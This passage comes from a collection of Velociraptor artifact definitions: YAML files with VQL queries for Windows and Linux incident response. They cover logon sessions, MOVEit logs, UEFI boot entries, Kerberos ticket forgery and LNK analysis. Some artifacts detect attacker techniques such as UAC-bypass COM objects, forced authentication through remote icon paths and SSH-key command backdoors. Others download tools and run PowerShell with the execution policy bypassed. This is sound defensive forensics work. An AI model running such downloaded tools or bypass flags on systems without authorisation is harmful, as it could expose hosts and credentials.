                get(member="description") AS Description, 
                get(member="rule_level") AS Severity,
                get(member="count") AS Count,
                get(member="tags") AS Tags,
                get(member="matches") AS Matches,
                get(member="sigma") AS _Sigma
            FROM Content    
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/BinaryVersion.yaml
======
name: Windows.System.BinaryVersion
author: "Matt Green - @mgreen27"
description: |
   This artifact will search the MFT for any matching filenames and return
   binary details. This artifact can be used to find all instances of a 
   binary on disk so its great for scoping both legititimate and illegitimate 
   files.

parameters:
   - name: TargetLibrary
     default: 'kernel32.dll'
     description: regex of target library filename e.g file.dll or ^(file.dll|file2.exe)$
   - name: TargetDrive
     default: 'C:\'
   - name: TargetAllDrives
     type: bool
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET hits = SELECT FileName, OSPath,
            dict(
                    LastModified0x10=LastModified0x10,
                    LastAccess0x10=LastAccess0x10,
                    LastRecordChange0x10=LastRecordChange0x10,
                    Created0x10=Created0x10
                ) as SI_Timestamps,
            dict(
                    LastModified0x30=LastModified0x30,
                    LastAccess0x30=LastAccess0x30,
                    LastRecordChange0x30=LastRecordChange0x30,
                    Created0x30=Created0x30
                ) as FN_Timestamps,
            SI_Lt_FN, uSecZeros,
            parse_pe(file=OSPath) as PE,
            authenticode(filename=OSPath) as Authenticode,
            InUse,
            FileSize
      FROM Artifact.Windows.NTFS.MFT(MFTDrive=TargetDrive,
            AllDrives=TargetAllDrives,
            FileRegex=TargetLibrary)

      SELECT *,
        InUse as MFTAllocated,
        hash(path=OSPath) as Hash,
        PE,
        Authenticode
      FROM hits
      WHERE PE OR Authenticode OR MFTAllocated = 'false'

---END OF FILE---

======
FILE: /content/exchange/artifacts/DetectRaptor.yaml
======
name: Server.Import.DetectRaptor
author: Matt Green - @mgreen27
description: |
   DetectRaptor is a collection of publicly availible Velociraptor detection content. 
   Most content is managed by a series of csv files and artifacts are automatically updated.
   
   This artifact will import the latest DetectRaptor bundle into the current server.
   
   A SHA1 of the imported DetectRaptor collection is stored in server metadata 
   for versioning.  
   A SHA1 of each artifact is generated on import to enable versioning confirmation.
   
   Last updated: 2023-09-09.   

   Current artifacts include:  
   
   - Windows.Detection.Amcache
   - Windows.Detection.Applications
   - Windows.Detection.BinaryRename
   - Windows.Detection.Evtx
   - Windows.Detection.HijackLibsEnv
   - Windows.Detection.HijackLibsMFT
   - Windows.Detection.LolDrivers
   - Windows.Detection.MFT
   - Windows.Detection.NamedPipes
   - Windows.Detection.Powershell.ISEAutoSave
   - Windows.Detection.Powershell.PSReadline
   - Windows.Detection.Webhistory
   - Windows.Detection.ZoneIdentifier
   - Server.StartHunts

reference:
  - https://github.com/mgreen27/DetectRaptor
  - https://github.com/svch0stz/velociraptor-detections
  - https://github.com/SigmaHQ/sigma

type: SERVER

required_permissions:
- SERVER_ADMIN

parameters:
   - name: ReleaseURL
     default: https://api.github.com/repos/mgreen27/DetectRaptor/releases
   - name: Prefix
     default: DetectRaptor.
     description: Prefix to append to all imported artifacts.
   - name: UpdateAnyway
     type: bool
     description: Import all artifacts even if previous version matches

sources:
  - query: |
      -- first check for version timestamp and find zip url
      LET content <= SELECT parse_json_array(data=Content)[0].assets[0] as Content 
        FROM http_client(url=ReleaseURL, headers=dict(`User-Agent`="Velociraptor - DetectRaptor"))
      LET check_version = SELECT Content.browser_download_url as TargetUrl,
            Content.updated_at as ZipTimestamp,
            if(condition= server_metadata().DetectRaptor,
                        then= parse_json(data=server_metadata().DetectRaptor).Timestamp
                            ) as InstalledTimestamp
        FROM content
        WHERE UpdateAnyway 
           OR NOT server_metadata().DetectRaptor
           OR NOT InstalledTimestamp 
           OR InstalledTimestamp < ZipTimestamp
                           
      -- get content return a row if new content or UpdateAnyway
      LET get_content = SELECT ZipPath,ZipTimestamp,ZipSHA1
        FROM foreach(row= check_version,
            query={ 
                SELECT Content as ZipPath, 
                    ZipTimestamp,
                    hash(path=Content,hashselect='SHA1').SHA1 as ZipSHA1 ,
                    if(condition= server_metadata().DetectRaptor,
                        then= parse_json(data=server_metadata().DetectRaptor).SHA1
                            ) as InstalledZipSHA1
                FROM http_client(remove_last=TRUE, 
                    tempfile_extension=".zip", url=TargetUrl,
                    headers=dict(`User-Agent`="Velociraptor - DetectRaptor"))
                WHERE NOT if(condition= UpdateAnyway,
                            then= False,
                            else= ZipSHA1 = InstalledZipSHA1 )
            })
                        
      -- extract and set artifacts
      LET set_artifacts <= SELECT 
            artifact_set(prefix=Prefix, definition=Definition) AS Definition,
            SHA1,
            ZipTimestamp,ZipSHA1
        FROM foreach(row=get_content, 
            query={
              SELECT read_file(accessor="zip", filename=OSPath) AS Definition,
                hash(path=OSPath,accessor='zip',hashselect='SHA1').SHA1 as SHA1,
                ZipTimestamp,ZipSHA1
              FROM glob(
                 globs='/**/*.yaml',
                 root=pathspec(
                    DelegateAccessor="auto",
                    DelegatePath=ZipPath),
                 accessor="zip")
            })
            
      -- Add new sha1 if set_artifacts
      LET add_new_metadata <= SELECT ZipSHA1,ZipTimestamp,
            server_set_metadata(
                metadata=dict(DetectRaptor=dict(
                    Timestamp=ZipTimestamp,
                    SHA1=ZipSHA1 ))) as SetMeta
        FROM set_artifacts
        WHERE log(level='INFO',
                message='DetectRaptor Server MetaData added: Timestamp=%v,SHA1=%v',
                args=[ZipTimestamp,ZipSHA1] )
        GROUP BY ZipSHA1

      SELECT Definition.name AS Name,
        Definition.description AS Description,
        Definition.author AS Author,
        SHA1
      FROM set_artifacts

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.DeepBlueCLI.yaml
======
name: Windows.EventLogs.DeepBlueCLI
description: DeepBlueCLI - a PowerShell Module for Threat Hunting via Windows Event Logs

author: Anthony Hannouille - @AnthoLaMalice
tools:
 - name: DeepBlueCLI
   url: https://github.com/sans-blue-team/DeepBlueCLI/archive/refs/heads/master.zip
type: CLIENT

precondition:
    SELECT OS From info() where OS = 'windows'

sources:
    - query: |
        LET Toolzip <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="DeepBlueCLI", IsExecutable=FALSE)
        
        LET TmpDir <= tempdir()
        
        LET _ <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)
        
        LET DeepBlueCLILocation <= TmpDir + '\\DeepBlueCLI-master'
        
        LET cmdline = 'powershell -executionpolicy bypass -command "cd  '+ "'" + DeepBlueCLILocation + "'" + '; .\\DeepBlue.ps1 | ConvertTo-JSON"'
        
        SELECT * FROM foreach(
            row={
                SELECT Stdout FROM execve(argv=["Powershell", cmdline], length=104857600)
                }, query={
                    SELECT * FROM parse_json_array(data=Stdout) where log(message=Stdout) AND log(message=Stderr)
                })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Audit.CISCat_Lite.yaml
======
name: Windows.Audit.CISCat_Lite
description: |
  This artifact runs the CISCat-Lite tool on the target machine and uploads the html output on the velociraptor server.
  
  CIS-CAT Lite is a free tool from the Center for Internet Security that helps in assessing and improving IT security configurations. 
  It enables unlimited system scans, provides compliance scores, and offers remediation steps based on CIS Benchmarks. 
  This tool is useful for organizations seeking to enhance their technology security.
 
  The artifact has been configured to perform a standard scan of a Windows 10 Enterprise machine. 
  To select the baseline and profiles, execute the command ".\Assessor-CLI.bat -i"
type: CLIENT

author: Antonio Blescia (TheThMando)

parameters:
  - name: BaselinePath
    default: "./benchmarks/CIS_Microsoft_Windows_10_Enterprise_Benchmark_v3.0.0-xccdf.xml"
  - name: ProfileName
    default: "Level 1 (L1) - Corporate/Enterprise Environment (general use)"

tools:
  - name: CISCat_Lite
    url: https://workbench.cisecurity.org/api/vendor/v1/cis-cat/lite/latest

sources:
  - precondition: SELECT OS From info() where OS = 'windows'

    query: |
      -- Generate the temp dir
      LET TmpDir <= tempdir(remove_last=true)
      -- Upload the CISCat_Lite tool on the host
      LET Toolzip <= SELECT OSPath
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="CISCat_Lite",
                                                IsExecutable=FALSE)
      -- Extract the CISCat_Lite tool zip
      LET _ <= SELECT *
        FROM unzip(filename=Toolzip.OSPath, output_directory=TmpDir, type="zip")
     
      -- Generate the absolute path that points the the extracted tool location  
      LET CISCatPath = path_join(
          components=[TmpDir, 'Assessor', 'Assessor-CLI.bat'],
          path_type='windows')
          
      -- Run the command     
      LET _ <= SELECT *
        FROM execve(argv=[CISCatPath, "-b", BaselinePath, '-p', ProfileName])

      SELECT * 
         FROM foreach( row={
             SELECT OSPath
             FROM glob(
                 globs='/Assessor/reports/*.html', root=TmpDir)
             WHERE NOT IsDir
         }, query={
              SELECT OSPath, upload(file=OSPath) AS Upload
              FROM scope()
         })
---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Nirsoft.LastActivityView.yaml
======
name: Custom.Windows.Nirsoft.LastActivityView
description: |
        LastActivityView is a tool for Windows operating system that collects information from various sources on a running system, and displays a log of actions made by the user and events occurred on this computer. The activity displayed by LastActivityView includes: Running .exe file, Opening open/save dialog-box, Opening file/folder from Explorer or other software, software installation, system shutdown/start, application or system crash, network connection/disconnection and more...
        

author: Yaniv Radunsky @ 10rootCyberSecurity

tools:
 - name: lastactivityview
   url: https://www.nirsoft.net/utils/lastactivityview.zip
   
precondition: SELECT OS From info() where OS = 'windows'

sources:
 - name: Upload
   query: |
   
        LET Hostname <= SELECT Hostname as Host FROM info()
        
        -- Fetch the binary
        LET Toolzip <= SELECT FullPath
        FROM Artifact.Generic.Utils.FetchBinary(ToolName="lastactivityview", IsExecutable=FALSE)

        LET TmpDir <= tempdir()

        -- Unzip the binary
        LET _ <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)

        -- Set EXE
        LET LastActivityViewExe <= TmpDir + '\\LastActivityView.exe'
        
        -- Build the exec command
        LET LastActivityViewCmd <= filter(list=(LastActivityViewExe, "/scomma", TmpDir + "\\" + Hostname.Host[0] + "-LastActivityView.csv" )
        ,  regex=".+")
        
        -- Run the tool.
        LET ExecLastActivityView <= SELECT *
        FROM execve(argv=LastActivityViewCmd,sep="\n", length=10000)
        
        -- Upload CSV to the hunt
        LET Upload <= SELECT Name, upload(file=FullPath,name=relpath(base=TmpDir + Hostname.Host[0] + "-LastActivityView.csv", path=FullPath)) as FileDetails
        FROM glob(globs="/**", root=TmpDir)
        WHERE Name =~ "(csv)$"
        
        -- Parse CSV to Notebook
        SELECT * FROM parse_csv(filename= TmpDir + "\\" + Hostname.Host[0] + "-LastActivityView.csv")

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.COMAutoApprovalList.yaml
======
name: Windows.Registry.COMAutoApprovalList
author: Wes Lambert - @therealwlambert
description: |
    This artifact will return COM objects that auto-elevate and bypass UAC (these could potentially be used by adversaries/malware to elevate privileges), and cross-reference the class ID with a name where able.

reference: 
    - https://twitter.com/d4rksystem/status/1562507028337131520?s=20&t=3k45RhMaSRvLr6kNc0fdKg
    - https://swapcontext.blogspot.com/2020/11/uac-bypasses-from-comautoapprovallist.html 

parameters:
 - name: KeyGlob
   default:  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList\**
 - name: ClsidGlob
   default: HKLM\SOFTWARE\Classes\CLSID\

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT {
               SELECT Data.value 
               FROM stat(filename=ClsidGlob + OSPath.Basename + "\\@",
                   accessor="registry")
             } AS Name,
             Data.value AS Enabled,
             OSPath.Basename AS GUID,
             OSPath AS ApprovalKey,
             Mtime
      FROM glob(globs=KeyGlob, accessor="registry") ORDER BY Mtime DESC

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.LogonSessions.yaml
======
name: Windows.EventLogs.LogonSessions
description: |
    This artifact searches for logon and logoff events within Security event logs identified
    by Event ID 4624 and 4634. These logon/logoff events are grouped by "TargetLogonId" field
    into "logon sessions". For each of these logon sessions, start, end and duration
    are derived


author: "Marinus Boekelo - Northwave"

type: CLIENT

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\Security.evtx'
  - name: UsernameRegex
    description: "Target username Regex"
    default: .
    type: regex
  - name: UsernameWhitelist
    description: "Target username witelist Regex"
    default: '\\$$'
    type: regex
  - name: ServerRegex
    description: "Target server regex"
    default: .
    type: regex
  - name: ProcessNameRegex
    description: "Target process Regex"
    default: .
  - name: ProcessNameWhitelist
    description: "Target process whitelist Regex"
    type: regex
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"

sources:
  - query: |

      -- firstly set timebounds for performance
      LET DateAfterTime <= if(condition=DateAfter,
          then=timestamp(epoch=DateAfter),
          else=timestamp(epoch="1600-01-01")
      )
      LET DateBeforeTime <= if(condition=DateBefore,
          then=timestamp(epoch=DateBefore),
          else=timestamp(epoch="2200-01-01")
      )

      -- expand provided glob into a list of paths on the file system (fs)
      LET fspaths <= SELECT FullPath
      FROM glob(globs=expand(path=EvtxGlob))

      -- function returning list of VSS paths corresponding to path
      LET vsspaths(path) = SELECT FullPath
      FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)

      -- function to search evtx files
      LET logonSearchAndGroup(PathList) =
        SELECT
          TargetLogonId,
          min(item=EventTime) as Start,
          max(item=EventTime) as End,
          max(item=System.TimeCreated.SystemTime)-min(item=System.TimeCreated.SystemTime) as Duration,
          System.Computer as SourceHost,
          enumerate(items=EventData) as EventDataList
        FROM foreach(
          row=PathList,
          query={
            SELECT
              timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS EventTime,
              EventData.TargetLogonId as TargetLogonId, EventData, System
            FROM
              parse_evtx(filename=FullPath)
            WHERE System.EventID.Value IN (4624,4634)
            AND EventData.TargetLogonId != 999
            AND EventTime < DateBeforeTime
            AND EventTime > DateAfterTime
          }
        ) GROUP BY TargetLogonId


      LET evtxsearch(PathList) =
      SELECT
        Start, End, Duration, SourceHost,
        EventDataList.SubjectUserSid AS SubjectUserSid,
        EventDataList.SubjectUserName AS SubjectUserName,
        EventDataList.SubjectDomainName AS SubjectDomainName,
        EventDataList.TargetLogonId AS TargetLogonId,
        EventDataList.TargetUserName AS TargetUserName,
        EventDataList.TargetDomainName AS TargetDomainName,
        EventDataList.TargetLogonId AS TargetLogonId,
        EventDataList.LogonType AS LogonType,
        EventDataList.LogonProcessName AS LogonProcessName,
        EventDataList.ProcessName AS ProcessName,
        EventDataList.IpAddress AS IpAddress
      FROM logonSearchAndGroup(PathList=PathList)
      WHERE TargetUserName =~ UsernameRegex
      AND NOT if(condition=UsernameWhitelist,
          then= TargetUserName =~ UsernameWhitelist,
          else= FALSE)
      AND ProcessName =~ ProcessNameRegex
      AND NOT if(condition=ProcessNameWhitelist,
          then= ProcessName =~ ProcessNameWhitelist,
          else= FALSE)
      ORDER BY Start


      -- include VSS in calculation and deduplicate with GROUP BY by file
      LET include_vss =
        SELECT * FROM foreach(
          row=fspaths,
          query={ SELECT * FROM evtxsearch(PathList={ SELECT FullPath FROM vsspaths(path=FullPath) }) }
        )

      -- exclude VSS in EvtxHunt`
      LET exclude_vss = SELECT *
        FROM evtxsearch(PathList={SELECT FullPath FROM fspaths})

      -- return rows
      SELECT * FROM if(condition=SearchVSS,
        then={ SELECT * FROM include_vss },
        else={ SELECT * FROM exclude_vss })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.DomainName.yaml
======
name: Windows.Registry.Domain
description: Checks the configured domain name on each endpoint
author: Angry-bender

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: DomainHive
    default: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Domain
sources:
  - queries:
    - |
            SELECT
                ModTime,
                OSPath.Dirname as registry_key,
                OSPath.Basename as registry_name,
                Data.value as registry_value
            FROM glob(globs=DomainHive, accessor="registry")

---END OF FILE---

======
FILE: /content/exchange/artifacts/MoveITEvtx.yaml
======
name:  Windows.EventLogs.MoveIt
author: Rapid7 team -  Ted Samuels, @mgreen27 & @scudette
description: |
  This Artifact enables scoping EventLogs from Progress Software's MoveIT File 
  Transfer. It is designed to assist in identifying exfiltration resulting from
  the exploitation of CVE-2023-34362
  
  This artifact parses EvtxHunter output and returns a set of fields in results.
  An unparsed data field is availible in the hidden _RawData field.
  
  There are several parameter's available for search leveraging regex.  
  
    - EvtxGlob glob of EventLogs to target. Default to MoveIt.evtx but can be targeted.  
    - dateAfter enables search for events after this date.  
    - dateBefore enables search for events before this date.  
    - IocRegex enables regex search over the message field.  
    - IgnoreRegex enables a regex whitelist for the Message field.  
    - IdRegex enables a regex query to select specific event Ids.  
    - SearchVSS enables searching over VSS.  
    
  NOTE: MoveIT event logging may not be turned on by default.

reference:
    - https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/ 
    - https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-respons
    - https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft
    - https://nvd.nist.gov/vuln/detail/CVE-2023-34362

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\MOVEit.evtx'
  - name: IocRegex
    type: regex
    description: "IOC Regex"
    default:
  - name: IgnoreRegex
    description: "Regex of string to witelist"
    type: regex
  - name: IdRegex
    default: .
    type: regex
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"

sources:
  - query: |
      LET Parse(X) = to_dict(
        item={
           SELECT split(sep=":", string=Column0)[0] AS _key,
                  regex_replace(re="^\\s+|\\s+$", replace="", source=split(sep=":", string=Column0)[1]) AS _value
           FROM split_records(accessor="data", filenames=X, regex="\r\n")
           WHERE Column0 =~ "^[a-zA-Z0-9]+:"
        }) +  parse_string_with_regex(regex="User '(?P<User>[^']+)'", string=X)

      SELECT EventTime,Computer,Channel,Provider,EventID,EventRecordID,
        Parse(X=split(string=EventData.Data[0],sep="\r\n\r\n")[1]) as EventData,
        split(string=EventData.Data[0],sep="\r\n\r\n")[0] as Message,
        FullPath,
        EventData.Data[0] as _RawData
      FROM Artifact.Windows.EventLogs.EvtxHunter(
                        EvtxGlob=EvtxGlob,
                        IocRegex=IocRegex,
                        IdRegex=IdRegex,
                        WhitelistRegex=IgnoreRegex,
                        DateAfter=DateAfter,
                        DateBefore=DateBefore, 
                        SearchVSS=SearchVSS )


---END OF FILE---

======
FILE: /content/exchange/artifacts/BootApplication.yaml
======
name: Windows.Forensics.UEFI.BootApplication
author: "Matt Green - @mgreen27"
description: |
    This artifact parses Windows MeasuredBoot TCGLogs to extract PathName of 
    EV_EFI_Boot_Services_Application events, which can assist detection of 
    potential ESP based persistance.  
    
    \EFI\Microsoft\Boot\bootmgfw.efi - the Windows boot manager on systems with 
    UEFI firmware.

    
    The artifact leverages Velociraptor tools to deploy and execute a powershell 
    module to parse TCGLogs on disk and memory.
    
    NOTE:
    
    - Recommended to host TCGLogTools and TCGLogToolsExecution locally to mitigate github connection limits.
    - AllParsedTCGLog can be large and is best suited to triage.
    - Thank you to mattifestation for TCGTools!

reference:
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  
type: CLIENT
resources:
  timeout: 6000

tools:
    - name: TCGLogTools
      url: https://raw.githubusercontent.com/mattifestation/TCGLogTools/master/TCGLogTools.psm1
    - name: TCGLogToolsExecution
      url: https://gist.githubusercontent.com/mgreen27/d7bd2480069f714f31296d5f38fe7f0c/raw/708002dd858a38e8e8885e926c3016f80057a7d4/Run-TCGLogTools.ps1
      

parameters:
  - name: TCGLogLocationGlob
    default: c:\Windows\Logs\MeasuredBoot\*.log
  - name: AllParsedTCGLog
    type: bool
    description: Return all parsed TCGLog data. This can be very large so best used as triage only!


precondition:
      SELECT OS From info() where OS = 'windows'

sources:
  - query: |
      -- Get the path to the TCGLogTools tool
      LET module <= SELECT OSPath
            FROM Artifact.Generic.Utils.FetchBinary(
                ToolName="TCGLogTools",
                IsExecutable=FALSE
                )
      LET script <= SELECT OSPath
            FROM Artifact.Generic.Utils.FetchBinary(
                ToolName="TCGLogToolsExecution",
                IsExecutable=FALSE
                )
      
      -- Run the tool and relay back the output
      LET data = SELECT *    
        FROM execve(argv=['powershell','-ExecutionPolicy','Unrestricted','-NoProfile','-File',script.OSPath[0]],
            env=dict(
                `TCGLogTools` = str(str=module.OSPath[0]),
                `TCGLogLocation` = TCGLogLocationGlob ),
            length=100000000)
        WHERE Stdout
        
      LET file_info(path) = SELECT OSPath,Size,Mtime,Atime,Ctime,Btime 
        FROM stat(filename=path)
      
      LET results <= SELECT *,
            if(condition= LogPath,
                then= file_info(path=LogPath)[0],
                else= Null ) as FileInfo
        FROM parse_json_array(data=data.Stdout)
        
      -- quick dynamic function to clean up multi entries for PathName
      LET bootapplication(data) = SELECT PathName FROM data.Event.DevicePath.DeviceInfo 
        WHERE PathName
        GROUP BY lowcase(string=PathName)
        
      LET clean_bootapplication(data) = SELECT _value as PathName FROM foreach(row=data) GROUP BY _value
        
      LET boot_application = SELECT 
            if(condition=FileInfo,
                then= FileInfo.OSPath,
                else= 'Current InMemory' ) as OSPath,
            FileInfo.Size as Size,
            FileInfo.Mtime as Mtime,
            FileInfo.Ctime as Ctime,
            FileInfo.Btime as Btime,
            clean_bootapplication(data=array(a=Events.PCR4.Event.DevicePath.DeviceInfo.PathName)).PathName as BootApplication
        FROM results
        
      -- cleaning up results and ensuring single string if not multiple BootApplication entries
      SELECT *,
        if(condition=len(list=BootApplication)=1,
            then= BootApplication[0],
            else= BootApplication ) as BootApplication
      FROM boot_application

    notebook:
      - type: vql
        name: BootApplication count
        template: |
          /*
          ## BootApplication by count
          */
          SELECT 
                BootApplication,
                min(item=Btime) as EarliestBtime,
                count() as TotalBoots
          FROM source(artifact="Exchange.Windows.Forensics.UEFI.BootApplication")
          GROUP BY lowcase(string=BootApplication)
          
          /*
          ##  All BootApplication
          */
          SELECT BootApplication, OSPath, Size, Mtime, Ctime, Btime
          FROM source(artifact="Exchange.Windows.Forensics.UEFI.BootApplication")
          
  - name: AllParsed
    queries:
      - |
        SELECT FileInfo,Header,Events
        FROM if(condition=AllParsedTCGLog, 
            then= results )

---END OF FILE---

======
FILE: /content/exchange/artifacts/RemoteIconForcedAuth.yaml
======
name: Windows.Detection.RemoteIconForcedAuth
author: ACEResponder.com
description: |
   Attackers plant SCF, URL, and LNK files with malicious icon file paths
   on file shares to escalate privileges or maintain persistence. This attack 
   only requires the user to browse to the location of the malicious file.
   This artifact enumerates file shares and returns an event for each file with a
   remote icon. It can also scan a target root directory since attackers commonly
   use other locations like desktops.
reference:
   - https://www.cisa.gov/news-events/alerts/2017/10/20/advanced-persistent-threat-activity-targeting-energy-and-other
   - https://attack.mitre.org/techniques/T1187/
   - https://github.com/mdsecactivebreach/Farmer

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: AllShares
     description: Scan all file shares on the host (excluding hidden shares). This option will ignore TargetFolder.
     type: bool
     default: Y
   - name: AllowList
     description: Each entry in the AllowList is checked against the TargetHost field. Matches are omitted.
     type: csv
     default: |
        TargetHost
   - name: TargetFolder
     description: Root folder to search for SCF, URL, and LNK files. Uncheck AllShares to run. Backslashes should be escaped.
     default: C:\\

     
imports:
  - Windows.Forensics.Lnk

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET script = '''
        $out = @()
        (Get-SmbShare | Where-Object {-not $_.Name.endswith('$')} | Select-Object -property Path) | %{
            $out += New-Object PSObject -Property @{
                Path = $_.Path + '\**\*.lnk'
            }
            $out += New-Object PSObject -Property @{
                Path = $_.Path + '\**\*.url'
            }
            $out += New-Object PSObject -Property @{
                Path = $_.Path + '\**\*.scf'
            }
        }
        $out | ConvertTo-Json
      '''
      
      LET paths = SELECT * FROM if(
        condition=AllShares, 
        then={SELECT * FROM foreach(row={SELECT Stdout FROM execve(argv=["Powershell", "-ExecutionPolicy","unrestricted", "-c", script], length=1000000)}, query = {SELECT * FROM parse_json_array(data=Stdout)})},
        else={SELECT * FROM parse_json_array(data='[{"Path":"'+TargetFolder+'\**\*"}]')}

        )

    
      LET hits = SELECT *, {
                    SELECT *
                    FROM Artifact.Windows.Forensics.Lnk(Glob=FullPath)
                    WHERE FullPath =~ "lnk$"
                  } as lnk_file,
                  {
                    SELECT Data,
                           parse_string_with_regex(
                               string=Data,
                               regex=['IconFile=(?P<IconLocation>.*)']) AS parsed
                            
                    FROM read_file(filenames=[FullPath])
                    WHERE FullPath =~ '(scf|url)'
                  } AS url_file
                  
      FROM glob(globs=array(a={SELECT * FROM paths}))
      WHERE FullPath =~ "(scf|url|lnk)$" AND (lnk_file.Icons=~'^\\\\' OR url_file.parsed.IconLocation=~'^\\\\')
      
      LET final = SELECT *, parse_string_with_regex(string=IconLocation,regex=['^\\\\\\\\(?P<host>\[^\\\\\]+)']).host AS TargetHost FROM foreach(row={SELECT * FROM hits}, query={
        SELECT * FROM if(
            condition=lnk_file,
            then={SELECT Name, ModTime, FullPath, OSPath, Mtime, Btime, Ctime, Atime, lnk_file.Icons AS IconLocation FROM hits WHERE lnk_file.Icons},
            else={SELECT Name, ModTime, FullPath, OSPath, Mtime, Btime, Ctime, Atime, url_file.parsed.IconLocation AS IconLocation, url_file.Data AS Data FROM hits}
            )
      }) WHERE NOT TargetHost IN AllowList.TargetHost AND IconLocation
      
      SELECT * FROM final


---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.SSHKeyFileCmd.yaml
======
name: Linux.Detection.SSHKeyFileCmd
author: alternate
description: |
   This artifact will parse ~/.ssh/authorized_keys and ~/.ssh/id_*.pub looking for the command option
   to detect potential persistence


reference: 
  - https://github.com/4ltern4te/velociraptor-contrib/blob/main/Linux.Detection.SSHKeyFileCmd/README.md
  - https://blog.thc.org/infecting-ssh-public-keys-with-backdoors
  - https://man.openbsd.org/OpenBSD-current/man8/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT

type: CLIENT

precondition: SELECT OS From info() where OS = "linux"

parameters:
  - name: SSHKeyFilesGlob
    default: |
      ["/{root,home/*}/.ssh/authorized_keys","/{root,home/*}/.ssh/authorized_keys2","/{root,home/*}/.ssh/*.pub"]

  - name: CommandRegex
    description: Command option regex
    default: (?P<CMD>command=".*?")
    type: regex

sources:
  - name: findSSHAuthKeyCmd
    query: |
      LET files = SELECT OSPath FROM glob(globs=parse_json_array(data=SSHKeyFilesGlob))
      SELECT OSPath, CMD FROM foreach(
          row=files,
          query={
            SELECT OSPath, CMD FROM parse_records_with_regex(file=OSPath, regex=CommandRegex)
          }
      )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.WonkaVision.yaml
======
name: Windows.Detection.WonkaVision
description: |
 
 This artifact analyzes Kerberos tickets and attempts to determine if they are forged, using WonkaVision by @4ndr3w6s and @exploitph.
 
 After analysis, notable events are documented in the native Windows Application log, and are easily reviewable using the `Exhange.Windows.EventLogs.WonkaVision` artifact.
 
 https://github.com/0xe7/WonkaVision
 
author: Wes Lambert -- @therealwlambert
reference:
  - https://github.com/0xe7/WonkaVision
tools:
  - name: WonkaVision
    url: https://github.com/weslambert/WonkaVision/releases/download/testing/WonkaVision.exe

sources:
    - name: RunWonkaVison
      query: |
        LET WV <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="WonkaVision", IsExecutable=FALSE)
        LET KeyDir <= tempdir(remove_last=true)
        LET DumpDir <= tempdir(remove_last=true)
        LET CreateKeys = SELECT * FROM execve(argv=[WV.FullPath[0], '/createkeys', '/outdir:' + KeyDir])
        LET DumpIt = SELECT * FROM execve(argv=[WV.FullPath[0], '/dump', '/publickey:' + KeyDir + '/public.key', '/dumpdir:' + DumpDir])
        LET AnalyzeIt = SELECT * FROM execve(argv=[WV.FullPath[0], '/analyze', '/privatekey:' + KeyDir + '/private.key', '/dumpdir:' + DumpDir])
        SELECT * FROM chain(
          a=CreateKeys,
          b=DumpIt,
          c=AnalyzeIt
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Applications.LECmd.yaml
======
name: Windows.Applications.LECmd
description: |
    Execute Eric Zimmerman's LECmd and return output for analysis.
    Created using @eduardfir SBECmd VQL as a quide.  
    LECmd is a CLI tool for analyzing lnk data. Learn more - https://github.com/EricZimmerman/LECmd

author: Carlos Cajigas @carlos_cajigas 

type: CLIENT

tools:
  - name: LECmd
    url: https://download.mikestammer.com/net6/LECmd.zip
    
parameters:
  - name: sourceFile
    default: .
    type: regex
    description: "RegEx pattern for the name or path of the lnk file. Example 'recent' folder"
  - name: localPath
    default: .
    type: regex
    description: "RegEx pattern for the name or path of the target of the lnk file. Example 'cmd.exe'"
  - name: arguments
    default: .
    type: regex
    description: "Arguments of the lnk file. Example '/c powershell Invoke-Command'"
  - name: dateAfter
    description: "search for lnk files with a SourceCreated after this date. YYYY-MM-DD"
  - name: dateBefore
    description: "search for lnk files with a SourceCreated before this date. YYYY-MM-DD"

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
      -- get context on target binary
      LET lecmdpackage <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
                    ToolName="LECmd", IsExecutable=FALSE)

      -- build tempfolder for output
      LET tmpdir <= tempdir()
      
      -- decompress utility
